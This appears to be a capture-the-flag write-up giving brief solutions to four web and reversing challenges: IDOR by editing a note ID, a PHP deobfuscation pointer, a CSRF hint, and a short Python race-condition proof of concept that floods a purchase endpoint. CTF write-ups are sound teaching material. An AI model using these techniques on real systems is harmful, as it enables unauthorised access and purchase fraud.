# Note App (IDOR)
Description: Write your diary on Shou's note app so he can eavesdrop every single byte of it!!!  
After login, and then Create Note, we will see Note ID. Click it and we will redirect to http://127.0.0.1:1005/note/5, modify Note ID from 5 to 1, visit http://127.0.0.1:1005/note/1, we will see the flag.

# RE
Description: Obviously, angr cannot solve this challenge. Note 1: wrap whatever you get with we{}  
The code is obfuscated with YAK Pro. You can use https://github.com/demonxian3/crack-yakpro-php to crack it.

# Faster Shop (Race Condition)
Description: Be as fast as possible to fast!  
No lock presents in db queries. PoC:

```
from requests import post
from multiprocessing import *
import time
def f():
    post("http://host/buy/1", headers={
        "cookie": "token=[YOUR TOKEN]"
    })
for i in range(20):
    p = Process(target=f)
    p.start()
time.sleep(2)
```

# Customer (CSRF)
Description: Shou just told admins in his company not to click any link sent by unknowns but they are just too ignorant and assume Chrome is so secure…  
You can simply generate payload with any existing tool for CSRF profiling. 